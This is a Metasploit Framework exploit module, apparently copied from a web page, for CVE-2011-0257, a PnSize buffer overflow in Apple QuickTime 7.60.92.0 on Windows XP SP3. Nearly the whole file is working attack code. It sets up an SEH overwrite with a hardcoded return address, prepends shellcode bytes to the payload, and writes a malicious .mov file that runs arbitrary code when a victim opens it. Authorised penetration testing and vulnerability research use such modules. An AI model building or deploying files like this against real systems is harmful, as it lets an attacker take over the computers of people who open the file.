# $Id: apple_quicktime_pnsize.rb 13691 2011-09-03 21:17:58Z mc $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = GoodRanking
 
    include Msf::Exploit::FILEFORMAT
    include Msf::Exploit::Seh
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Apple QuickTime PICT PnSize Buffer Overflow&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a vulnerability in Apple QuickTime Player 7.60.92.0.
                When opening a .mov file containing a specially crafted PnSize value, an attacker
                may be able to execute arbitrary code.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         => [ &#039;MC&#039; ],
            &#039;Version&#039;        => &#039;$Revision: 13691 $&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;CVE&#039;, &#039;2011-0257&#039; ],
                    [ &#039;BID&#039;, &#039;49144&#039; ],
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;process&#039;,
                    &#039;DisablePayloadHandler&#039; => &#039;true&#039;,
                },
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;    => 750,
                    &#039;BadChars&#039; => "",
                    &#039;EncoderType&#039;   => Msf::Encoder::Type::AlphanumUpper,
                    &#039;DisableNops&#039;  =>  &#039;True&#039;,
                    &#039;PrependEncoder&#039; => "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff",
                    &#039;EncoderOptions&#039; =>
                        {
                            &#039;BufferRegister&#039; => &#039;ECX&#039;,
                        },
                },
            &#039;Platform&#039; => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [ &#039;Windows XP SP3&#039;, { &#039;Ret&#039; => 0x672b6d4a } ], # QuickTime.qts 7.60.92.0
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => &#039;Aug 8 2011&#039;,
            &#039;DefaultTarget&#039;  => 0))
 
        register_options(
            [
                OptString.new(&#039;FILENAME&#039;,   [ false, &#039;The file name.&#039;,  &#039;msf.mov&#039; ]),
            ], self.class)
    end
 
    def exploit
 
        trigger = rand_text_alpha_upper(3324)
        trigger[2302, 8]  = generate_seh_record(target.ret)
        trigger[2310, payload.encoded.size] = payload.encoded
 
        path = File.join( Msf::Config.install_root, "data", "exploits", "CVE-2011-0257.mov" )
        fd = File.open(path, "rb" )
        sploit = fd.read(fd.stat.size)
        fd.close
 
        sploit << trigger
 
        file_create(sploit)
    end
end
__END__
http://mirrors.apple2.org.za/apple.cabi.net/Graphics/PICT.and_QT.INFO/PICT.file.format.TI.txt
 
Opcode   Name                       Description                  Data Size (in bytes)
 
$0007    PnSize                     pen size (point)             4



